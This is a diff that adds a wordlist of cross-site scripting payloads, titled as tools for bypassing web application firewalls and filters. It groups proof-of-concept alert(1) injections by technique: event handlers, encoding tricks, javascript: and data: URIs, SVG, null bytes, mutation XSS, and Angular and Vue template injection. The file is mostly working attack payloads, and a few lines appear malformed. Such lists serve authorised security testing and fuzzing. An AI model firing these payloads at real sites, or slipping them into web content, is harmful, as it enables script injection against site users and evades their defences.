@@ -1,0 +1,111 @@
+# ============================================================================
+# XSS - WAF BYPASS PAYLOADS
+# ============================================================================
+# Advanced XSS payloads to bypass WAF and filters
+# ============================================================================
+
+# Basic Tags (Variations)
+<script>alert(1)</script>
+<ScRiPt>alert(1)</ScRiPt>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<SCRIPT>alert(1)</SCRIPT>
+
+# Event Handlers
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert(1)">
+<img/src=x onerror=alert(1)>
+<img src=x onload=alert(1)>
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<input onfocus=alert(1) autofocus>
+<input onblur=alert(1) autofocus><input autofocus>
+<marquee onstart=alert(1)>
+<video src=x onerror=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">CLICKME
+
+# No Parentheses
+<script>alert`1`</script>
+<img src=x onerror=alert`1`>
+<svg onload=alert`1`>
+
+# No Quotes
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(String.fromCharCode(88,83,83))>
+
+# Encoded Payloads
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
+<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
+<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+
+# JavaScript Protocol
+javascript:alert(1)
+javascript:alert(1)//
+JaVaScRiPt:alert(1)
+javascript://%0aalert(1)
+javascript:/**/alert(1)
+
+# Data URI
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+# SVG Payloads
+<svg><script>alert(1)</script></svg>
+<svg><script>alert&lpar;1&rpar;</script></svg>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><set onbegin=alert(1) attributeName=x>
+<svg><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(1)</handler></svg>
+
+# Object/Embed
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<iframe src="javascript:alert(1)">
+<iframe srcdoc="<script>alert(1)</script>">
+
+# Expression (IE)
+<div style="x:expression(alert(1))">
+<div style="width:expression(alert(1))">
+
+# Template Literals
+<script>alert`XSS`</script>
+${alert(1)}
+{{constructor.constructor('alert(1)')()}}
+
+# Filter Bypass (Using HTML entities)
+&lt;script&gt;alert(1)&lt;/script&gt;
+<img src=&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
+
+# Null Bytes
+<scri%00pt>alert(1)</scri%00pt>
+<img src=x one%00rror=alert(1)>
+
+# Unicode Normalization
+＜script＞alert(1)＜/script＞
+<scrıpt>alert(1)</scrıpt>
+
+# Mutation XSS
+<noscript><p title="</noscript><script>alert(1)</script>">
+<title><img src=x onerror=alert(1)></title>
+
+# DOM XSS Payloads
+'-alert(1)-'
+"-alert(1)-"
+\'-alert(1)-\'
+\"-alert(1)-\"
+</script><script>alert(1)</script>
+*/alert(1)/*
+*/alert(1)//
+
+# Angular Template Injection (XSS)
+{{$on.constructor('alert(1)')()}}
+{{constructor.constructor('alert(1)')()}}
+{{a]constructor.prototype.charAt=[].join;$eval('x]alert(1)');}}
+
+# Vue.js Template Injection
+{{_c.constructor('alert(1)')()}}
+{{_openBlock.constructor('alert(1)')()}}
